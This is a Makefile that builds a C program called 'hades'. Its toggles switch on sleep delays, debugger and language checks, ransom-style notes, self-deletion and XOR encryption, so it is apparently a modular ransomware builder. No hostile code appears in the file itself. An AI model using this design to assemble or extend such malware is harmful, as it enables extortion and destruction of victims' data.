
GCC = gcc
SOURCES := src/hades.c src/lib/directory_files.c
output = hades

.PHONY: default

default: nosleep nodebug nolanguage nonote noautodelete noencrypt compile

nosleep: src/nolib/sleep.c
	$(eval SOURCES += $^)

sleep: src/lib/sleep.c
	$(eval SOURCES += $^)

nodebug: src/nolib/check_debug.c
	$(eval SOURCES += $^)

debug: src/lib/check_debug.c
	$(eval SOURCES += $^)

nolanguage: src/nolib/check_language.c
	$(eval SOURCES += $^)

language: src/lib/check_language.c
	$(eval SOURCES += $^)

nonote: src/nolib/add_notes.c
	$(eval SOURCES += $^)

note: src/lib/add_notes.c
	$(eval SOURCES += $^)

noautodelete: src/nolib/autodelete.c
	$(eval SOURCES += $^)

autodelete: src/lib/autodelete.c
	$(eval SOURCES += $^)

noencrypt: src/nolib/encrypt.c
	$(eval SOURCES += $^)

xorencrypt: src/lib/xor_encrypt.c
	$(eval SOURCES += $^)

compile:
	$(GCC) $(SOURCES) -o $(output)
